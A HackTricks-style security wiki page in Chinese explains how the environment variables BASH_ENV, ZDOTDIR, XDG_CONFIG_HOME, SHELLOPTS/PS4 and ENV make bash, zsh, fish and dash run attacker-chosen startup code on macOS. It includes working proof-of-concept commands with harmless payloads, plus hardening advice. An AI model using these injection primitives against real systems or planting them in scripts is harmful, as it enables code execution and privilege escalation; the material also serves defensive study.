# macOS Shell Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `BASH_ENV`

当 Bash 以非交互方式运行脚本或 `-c` 命令时，它会展开 `BASH_ENV` 的值，并在执行请求的命令之前 source 生成的文件。Bash 不会使用 `PATH` 查找此文件。因此，如果某个进程使用攻击者可控的环境变量启动非交互式 Bash，就可以使其先执行一个可读取的 shell payload。<sup>[[1]](#references)</sup>
```bash
cat >/tmp/bash-startup-hook.sh <<'EOF'
#!/bin/bash
/usr/bin/touch /tmp/bash-env-executed
EOF

BASH_ENV=/tmp/bash-startup-hook.sh /bin/bash -c '/usr/bin/true'
test -e /tmp/bash-env-executed && echo 'BASH_ENV executed'
```
该 hook 仅在目标实际启动 Bash 时运行；其他平台上的 `/bin/sh`，或不使用 shell 执行命令的程序，不一定会遵循它。Bash 在 privileged mode 下会忽略 `BASH_ENV`。当 effective 和 real user/group IDs 不同时，Bash 也会跳过启动文件，并在未提供 `-p` 时重置 effective IDs；使用 `-p` 时，privileged mode 会保持启用，且 `BASH_ENV` 仍会被忽略。<sup>[[1]](#references)[[2]](#references)</sup>

在 macOS 上，`launchd` jobs 可以定义继承的或按 job 设置的环境变量，因此应检查为 privileged scripts 提供环境的 plists 和 launch contexts。不要仅依赖 SIP 来清理 interpreter variables：使用最小环境（`env -i`），显式取消设置 `BASH_ENV`，通过绝对路径调用预期的 interpreter，并避免使用可写的启动文件。

## zsh `ZDOTDIR`

zsh 会为每个普通 shell 读取 `$ZDOTDIR/.zshenv`，包括 non-interactive shells；如果未设置 `ZDOTDIR`，则使用 `HOME`。因此，将 `ZDOTDIR` 重定向到可写目录，会在执行 `zsh -c` 命令或 script 之前执行其中的 `.zshenv`。<sup>[[3]](#references)</sup>
```bash
mkdir -p /tmp/zsh-startup
echo '/usr/bin/touch /tmp/zshenv-executed' > /tmp/zsh-startup/.zshenv
ZDOTDIR=/tmp/zsh-startup /bin/zsh -c /usr/bin/true
```
`zsh -f`会取消设置`RCS`选项，并跳过此用户启动文件。全局`/etc/zshenv`仍会被读取，因此必须保持受信任且精简。

## fish `XDG_CONFIG_HOME`

fish会在每个shell启动时读取`$XDG_CONFIG_HOME/fish/conf.d/*.fish`和`$XDG_CONFIG_HOME/fish/config.fish`，而不仅是在interactive或login shell中读取。它还会在`XDG_DATA_DIRS`中的条目下执行`fish/vendor_conf.d/*.fish`。因此，控制这些变量之一以及一个可读取目录的攻击者，可以在fish脚本或`-c`命令运行前执行代码。<sup>[[4]](#references)</sup>
```bash
mkdir -p /tmp/fish-startup/fish
echo 'touch /tmp/fish-config-executed' > /tmp/fish-startup/fish/config.fish
XDG_CONFIG_HOME=/tmp/fish-startup fish -c true

# Vendor configuration variant
mkdir -p /tmp/fish-vendor/fish/vendor_conf.d
echo 'touch /tmp/fish-vendor-executed' > /tmp/fish-vendor/fish/vendor_conf.d/10-hook.fish
XDG_DATA_DIRS=/tmp/fish-vendor fish -c true
```
使用 `fish --no-config` 进行受信任的调用，并清除不受信任的 XDG 路径变量。

## bash `PS4` + xtrace (`SHELLOPTS`)

当 Bash 启用 **xtrace** 选项时，它会在每条被跟踪的命令之前展开 `PS4` 并将其打印出来。`PS4` 的展开方式与提示符相同，因此其中的 **command substitution** 会被执行。**`PS4` 的值**以及启用 xtrace 的方式都可以完全来自环境：导出 `SHELLOPTS=xtrace` 会为普通的 `bash script.sh` 启用 xtrace（无需 `-x` 标志）。这会将受害者运行的任何 Bash script 转变为代码执行。<sup>[[5]](#references)</sup>
```bash
echo 'x=1; echo done' > /tmp/victim.sh

# Pure environment-variable injection (no -x on the command line)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a maintenance/CI job is run with debugging on
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```
`PS4` 单独不会产生任何作用，直到启用 xtrace（通过 `SHELLOPTS=xtrace`、`set -x` 或 `bash -x`）。Bash 在 **privileged mode** 下会忽略 `SHELLOPTS`（真实 ID 与有效 ID 不同，且未使用 `-p` 处理），因此适用与 `BASH_ENV` 相同的 setuid 注意事项。

## POSIX `ENV`

POSIX 风格的 shells（`/bin/sh`、`dash`、`ksh`）会读取 `ENV` 变量，对其进行展开，并在启动 **interactive** shell 时 source 展开后的文件。它是 `BASH_ENV` 的 POSIX 对应物（后者适用于 *non-interactive* Bash），因此，控制 `ENV` 后，只要受害者启动 interactive `sh`/`dash`，就会执行其中的代码。
```bash
echo 'touch /tmp/env-executed' > /tmp/env-hook.sh
echo 'exit' | ENV=/tmp/env-hook.sh dash -i
test -e /tmp/env-executed && echo 'ENV executed'
```
## References

- [1] [Bash 启动文件](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files)
- [2] [Bash 调用 Bash](https://www.gnu.org/software/bash/manual/html_node/Invoking-Bash.html)
- [3] [zsh 启动/关闭文件](https://zsh.sourceforge.io/Doc/Release/Files.html#Startup_002fShutdown-Files)
- [4] [fish 配置文件](https://fishshell.com/docs/current/language.html#configuration-files)
- [5] [Bash 变量 — `PS4` 和 Set 内建命令 (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
{{#include ../../../banners/hacktricks-training.md}}
